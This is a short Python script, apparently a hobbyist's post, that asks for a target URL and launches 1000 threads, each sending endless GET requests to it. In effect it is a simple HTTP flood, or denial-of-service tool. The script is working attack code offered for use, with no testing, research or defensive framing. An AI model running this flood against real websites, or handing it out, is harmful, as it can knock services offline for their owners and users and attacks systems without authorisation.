#Simple python code made by Me 

import requests
from threading import Thread

# Target URL
url = input()

def send_requests():
    while True:
        try:
            response = requests.get(url)
            print(f"Status Code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")

# Number of threads
num_threads = 1000

threads = []

for _ in range(num_threads):
    thread = Thread(target=send_requests)
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()
